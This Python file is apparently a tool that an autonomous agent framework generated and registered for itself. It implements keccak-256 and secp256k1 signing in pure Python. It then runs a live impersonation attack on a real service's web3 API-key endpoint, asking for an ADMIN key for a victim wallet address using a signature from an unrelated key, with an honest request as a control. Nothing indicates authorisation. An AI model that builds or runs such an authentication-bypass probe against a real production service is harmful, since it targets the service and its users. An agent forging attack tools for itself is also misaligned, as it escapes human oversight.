"""VOIDFORGE :: forged tool — ecdsa_impersonation_test
Self-contained ECDSA secp256k1 + keccak signer (pure python, zero deps): fetches Venice web3_key challenge, tests wallet impersonation (victim addr + our sig) AND honest control, returns both verdicts
Forged by the strategist on 2026-09-01. Edit freely; delete the file to disarm.
"""
import json, re, time, urllib.request, urllib.error


def run(**kwargs):
    import json, urllib.request, urllib.error, secrets
    out = {"steps": []}
    # ---------- keccak-256 ----------
    def keccak256(data):
        try:
            from Crypto.Hash import keccak
            k = keccak.new(digest_bits=256); k.update(data)
            return k.digest()
        except Exception:
            pass
        try:
            import sha3
            return sha3.keccak_256(data).digest()
        except Exception:
            pass
        # pure python keccak-f[1600]
        RC = [0x0000000000000001,0x0000000000008082,0x800000000000808A,0x8000000080008000,
              0x000000000000808B,0x0000000080000001,0x8000000080008081,0x8000000000008009,
              0x000000000000008A,0x0000000000000088,0x0000000080008009,0x000000008000000A,
              0x000000008000808B,0x800000000000008B,0x8000000000008089,0x8000000000008003,
              0x8000000000008002,0x8000000000000080,0x000000000000800A,0x800000008000000A,
              0x8000000080008081,0x8000000000008080,0x0000000080000001,0x8000000080008008]
        R = [[0,36,3,41,18],[1,44,10,45,2],[62,6,43,15,61],[28,55,25,21,56],[27,20,39,8,14]]
        M = (1 << 64) - 1
        def rol(x, n): n %= 64; return ((x << n) | (x >> (64 - n))) & M
        st = [[0]*5 for _ in range(5)]
        rate = 136
        pad = bytearray(data)
        pad.append(0x01)
        while len(pad) % rate != 0:
            pad.append(0)
        pad[-1] |= 0x80
        for off in range(0, len(pad), rate):
            blk = pad[off:off+rate]
            for i in range(rate // 8):
                x, y = i % 5, i // 5
                w = int.from_bytes(blk[i*8:(i+1)*8], 'little')
                st[x][y] ^= w
            for rnd in range(24):
                C = [st[x][0] ^ st[x][1] ^ st[x][2] ^ st[x][3] ^ st[x][4] for x in range(5)]
                D = [C[(x-1)%5] ^ rol(C[(x+1)%5], 1) for x in range(5)]
                for x in range(5):
                    for y in range(5):
                        st[x][y] ^= D[x]
                B = [[0]*5 for _ in range(5)]
                for x in range(5):
                    for y in range(5):
                        B[y][(2*x + 3*y) % 5] = rol(st[x][y], R[x][y])
                for x in range(5):
                    for y in range(5):
                        st[x][y] = B[x][y] ^ ((~B[(x+1)%5][y]) & M & B[(x+2)%5][y])
                st[0][0] ^= RC[rnd]
        # squeeze 32 bytes
        outb = b''
        while len(outb) < 32:
            for i in range(rate // 8):
                if len(outb) >= 32: break
                x, y = i % 5, i // 5
                outb += st[x][y].to_bytes(8, 'little')
        return outb[:32]
    # ---------- secp256k1 ----------
    P = 2**256 - 2**32 - 977
    N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
    Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
    def inv(a, m): return pow(a, -1, m)
    def padd(p1, p2):
        if p1 is None: return p2
        if p2 is None: return p1
        (x1, y1), (x2, y2) = p1, p2
        if x1 == x2 and (y1 + y2) % P == 0: return None
        if p1 == p2:
            l = (3 * x1 * x1) * inv(2 * y1, P) % P
        else:
            l = (y2 - y1) * inv(x2 - x1, P) % P
        x3 = (l * l - x1 - x2) % P
        y3 = (l * (x1 - x3) - y1) % P
        return (x3, y3)
    def pmul(k, pt):
        r = None
        while k:
            if k & 1: r = padd(r, pt)
            pt = padd(pt, pt)
            k >>= 1
        return r
    # ---------- mint & sign ----------
    d = int.from_bytes(secrets.token_bytes(32), 'big') % N
    pub = pmul(d, (Gx, Gy))
    addr = '0x' + keccak256(pub[0].to_bytes(32,'big') + pub[1].to_bytes(32,'big'))[-20:].hex()
    VICTIM = "0x0000000000000000000000000000000000000001"
    BASE = "https://api.venice.ai/api/v1/api_keys/generate_web3_key"
    def challenge(address):
        with urllib.request.urlopen(BASE + "?address=" + address + "&apiKeyType=ADMIN", timeout=25) as r:
            return json.loads(r.read())["data"]["token"]
    def sign(msg):
        z = int.from_bytes(keccak256(b"\x19Ethereum Signed Message:\n" + str(len(msg)).encode() + msg.encode()), 'big')
        while True:
            k = int.from_bytes(secrets.token_bytes(32), 'big') % N
            if k == 0: continue
            R = pmul(k, (Gx, Gy))
            r = R[0] % N
            if r == 0: continue
            s = (inv(k, N) * (z + r * d)) % N
            recid = 1 if R[1] % 2 else 0
            if s > N // 2:
                s = N - s
                recid ^= 1
            if s == 0: continue
            return '0x' + r.to_bytes(32,'big').hex() + s.to_bytes(32,'big').hex() + hex(27 + recid)[2:]
    def post(body):
        req = urllib.request.Request(BASE, data=json.dumps(body).encode(),
                                     headers={"Content-Type": "application/json"}, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=25) as r:
                return {"status": r.status, "body": json.loads(r.read())}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": e.read().decode()[:600]}
        except Exception as e:
            return {"status": -1, "body": repr(e)}
    try:
        tok = challenge(VICTIM)
        out["steps"].append({"step": "challenge_victim", "ok": True})
        sig = sign(tok)
        out["steps"].append({"step": "sign", "ok": True, "signer": addr})
        out["counterfeit"] = post({"apiKeyType": "ADMIN", "address": VICTIM, "signature": sig, "token": tok})
        tok2 = challenge(addr)
        sig2 = sign(tok2)
        out["honest"] = post({"apiKeyType": "ADMIN", "address": addr, "signature": sig2, "token": tok2})
        out["ok"] = True
    except Exception as e:
        out["error"] = repr(e)
        out["keccak_selftest"] = keccak256(b'').hex()
    return json.dumps(out)


from tools import register as _vf_register
_vf_register('forged_ecdsa_impersonation_test', 'Self-contained ECDSA secp256k1 + keccak signer (pure python, zero deps): fetches Venice web3_key challenge, tests wallet impersonation (victim addr + our sig) AND honest control, returns both verdicts', {'properties': {}, 'type': 'object'}, 'active')(run)
